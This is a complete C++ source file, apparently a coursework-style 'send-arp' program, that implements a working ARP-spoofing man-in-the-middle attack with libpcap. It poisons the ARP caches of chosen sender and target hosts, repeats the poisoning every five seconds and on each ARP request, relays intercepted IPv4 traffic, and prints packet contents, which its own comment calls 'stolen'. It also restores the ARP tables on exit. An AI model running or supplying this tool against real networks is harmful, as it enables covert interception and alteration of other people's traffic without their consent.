#define core_num 4
#include <iostream>
#include <string>
#include <stdint.h>
#include <cstring>
#include <pcap.h>
#include <ctype.h>
#include <unistd.h>
#include "proto_structures.h"
#include "local_address.h"
#include <map>
#include <set>
#include <utility>
#include <vector>
#include <queue>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>

#if core_num < 2
#error "set core_num minimal 2"
#endif
#define dbg std::cout<<"dbg: "<<__LINE__<<std::endl;

struct maccmp{
	bool operator()(const mac_addr& a,const mac_addr& b) const{
		return memcmp(&a,&b,6)<0;
	}
};

std::map<uint32_t,mac_addr> ip_to_mac;

std::map<uint32_t,std::set<uint32_t>> s2t;
std::map<uint32_t,std::set<uint32_t>> t2s;

std::queue<uint8_t*> Q;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
sem_t sem;

pcap_t* ohandle;
pthread_mutex_t omutex = PTHREAD_MUTEX_INITIALIZER;

pthread_mutex_t stdoutmutex = PTHREAD_MUTEX_INITIALIZER;

ipv4_addr my_ip;
mac_addr my_mac;
ipv4_addr real_gateway;

int sigint_flag=0; // 0 : continue spoofing -> 1 : sigint detected -> 2 : sender arp table recovered

void sigintHandler(int sig)
{
	if(sigint_flag)
		exit(0);
	pthread_mutex_lock(&stdoutmutex);
	std::cout<<"\nterminate process started : it will take about 5~10 second \ninterupt again for forced exit"<<std::endl;
	pthread_mutex_unlock(&stdoutmutex);
	sigint_flag=1;
}
void setsigint(){
	if (signal(SIGINT, sigintHandler) == SIG_ERR){
		printf("signal setting error\n");
		exit(1);
	}
}

void add_ip(const ipv4_addr& ip,pcap_t* handle){
	if(ip_to_mac.find(ip.word)!=ip_to_mac.end())
		return;
	for(;;){
		arp_eth_ipv4 packet(my_mac,my_ip,ip);
		pcap_sendpacket(handle,packet,sizeof packet);
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("arp no reply\n");
			exit(1);
		}
		memcpy(&packet,ptr,sizeof packet);
		if(packet.sip.word==ip.word&&packet.arptype==htons(0x0002)){
			ip_to_mac[ip.word]=packet.smac;
			return;
		}
	}
}

void arp_poison(const ipv4_addr& sip,const ipv4_addr& tip){
	mac_addr smac=ip_to_mac[sip.word];
	arp_eth_ipv4 packet(my_mac,smac,tip,sip);
	pthread_mutex_lock(&omutex);
	pcap_sendpacket(ohandle,packet,sizeof packet);
	pthread_mutex_unlock(&omutex);
}
void arp_recover(const ipv4_addr& sip,const ipv4_addr& tip){
	mac_addr smac=ip_to_mac[sip.word];
	mac_addr tmac=ip_to_mac[tip.word];
	arp_eth_ipv4 packet(tmac,smac,tip,sip);packet.src=my_mac;
	pthread_mutex_lock(&omutex);
	pcap_sendpacket(ohandle,packet,sizeof packet);
	pthread_mutex_unlock(&omutex);
}

void process_arp(arp_eth_ipv4* packet){
	int flag=1;
	if(packet->arptype==2) // is reply
		return;
	if(s2t.find(packet->sip.word)!=s2t.end()){ // is sender's request
		if(s2t[packet->sip.word].find(packet->tip.word)!=s2t[packet->sip.word].end()){
			if(packet->dst.is_broadcast()){
				usleep(200000); // 0.2 second delay to wait until legal reply processed first
				flag=0;
			} // no legal reply when it is not broadcast
			arp_poison(packet->sip,packet->tip);
		}
	}
	if(t2s.find(packet->sip.word)!=t2s.end()){ // is target's request
		if(packet->dst.is_broadcast()){
			if(flag){
				usleep(200000); // 0.2 second delay to wait until legal reply processed first
				flag=0;
			}
			for(uint32_t s:t2s[packet->sip.word]){
				ipv4_addr sip;sip.word=s;
				arp_poison(sip,packet->sip);
			}
		}
	}
}

void process_ip(ipv4_eth* packet,int len){
	
	//std::cout<<"!"<<std::string(packet->src)<<" -> "<<std::string(packet->dst)<<" : "<<len<<"bytes\n";
	
	if(ip_to_mac.find(packet->sip.word)==ip_to_mac.end()
		&&ip_to_mac.find(packet->tip.word)==ip_to_mac.end())
			return;
	
	pthread_mutex_lock(&stdoutmutex); // display stolen packet..or we can just use wireshark
	std::cout<<"[+]"<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
	int plen=len;if(plen>100)plen=100;
	char* str=(char*)packet;
	for(int i=0;i<plen;i++)
		std::cout<< (isprint(str[i])?str[i]:'.');
	std::cout<<'\n'<<std::endl;
	pthread_mutex_unlock(&stdoutmutex);
	
	packet->src = my_mac;
	if(ip_to_mac.find(packet->tip.word)!=ip_to_mac.end())
		packet->dst = ip_to_mac[packet->tip.word];
	else
		packet->dst = ip_to_mac[real_gateway.word];
	// relay packet
	pthread_mutex_lock(&omutex);
	pcap_sendpacket(ohandle,*packet,len);
	pthread_mutex_unlock(&omutex);
}

void* process_packet(void* nevermind){
	for(;;){
		sem_wait(&sem);
		pthread_mutex_lock(&mutex);
		uint8_t* param=Q.front();Q.pop();
		pthread_mutex_unlock(&mutex);
		if(param==nullptr)
			return nullptr;
		int len = 0[(uint32_t*)param];
		arp_eth_ipv4* arp=(arp_eth_ipv4*)(4+param);
		if(arp->is_valid()){ // actually, test ethertype
			process_arp(arp);
		}
		else if(!sigint_flag){
			ipv4_eth* ipv4=(ipv4_eth*)(4+param);
			if(ipv4->is_valid()){
				process_ip(ipv4,len);
			}
			//nothing to do when it is neither ipv4 nor arp
		}
		free(param);
	}
}

void* continue_poisoning(void* param){
	std::vector<std::pair<ipv4_addr,ipv4_addr>>& stpairs=*(std::vector<std::pair<ipv4_addr,ipv4_addr>>*)param;
	while(!sigint_flag){
		for(auto&[s,t]:stpairs)
			arp_poison(s,t);
		sleep(5); // arp poison every 5 second
	}
	for(auto&[s,t]:stpairs)
		arp_recover(s,t);
	sleep(5);
	sigint_flag=2;
	return nullptr;
}

int main(int c,char **v){
	if(c&1){
		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
		return 1;
	}
	char errbuf[PCAP_ERRBUF_SIZE];
	my_mac=get_mac_addr(v[1]);
	my_ip=get_ipv4_addr(v[1]);
	real_gateway=get_gateway_addr(v[1]);
	std::cout<<"gateway : "<<std::string(real_gateway)<<std::endl;
	if(!real_gateway.word)
		return 0;
	
	std::vector<std::pair<ipv4_addr,ipv4_addr>> stpairs;
	for(int i=2;i<c;i+=2){
		ipv4_addr s(v[i]);
		ipv4_addr t(v[i+1]);
		stpairs.emplace_back(s,t);
		s2t[s.word].insert(t.word);
		t2s[t.word].insert(s.word);
	}
	pcap_t* handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	ohandle=pcap_open_live(v[1],0,0,0,errbuf); // output only handle
	if(ohandle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	add_ip(real_gateway,handle);
	for(int i=2;i<c;i++)
		add_ip(v[i],handle);
	pthread_t th[core_num];
	void * nevermind;
	sem_init(&sem, 0, 0);
	setsigint();
	
	if(pthread_create(th,NULL,continue_poisoning,&stpairs)){
		printf("thread error\n");
		exit(1);
	}
	for(int i=1;i<core_num;i++){
		if(pthread_create(th+i,NULL,process_packet,nullptr)){
			printf("thread error\n");
			exit(1);
		}
	}
	while(sigint_flag<2){
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("pcap listing failed\n");
			exit(1);
		}
		
		int len=hdr->caplen;
		uint8_t* packet=(uint8_t*)malloc(len+4);
		
		if(packet==nullptr){
			printf("malloc failed\n");
			exit(1);
		}
		
		memcpy(packet+4,ptr,len);
		0[(uint32_t*)packet]=len;
		
		pthread_mutex_lock(&mutex);
		Q.push(packet);
		pthread_mutex_unlock(&mutex);
		sem_post(&sem);
	}
	
	sem_destroy(&sem);
	pthread_join(th[0], &nevermind);
	for(int i=1;i<core_num;i++){
		pthread_mutex_lock(&mutex);
		Q.push(nullptr);
		pthread_mutex_unlock(&mutex);
		sem_post(&sem);
	}
	for(int i=1;i<core_num;i++)
		pthread_join(th[i], &nevermind);
	pcap_close(handle);
	pcap_close(ohandle);
	return 0;
}
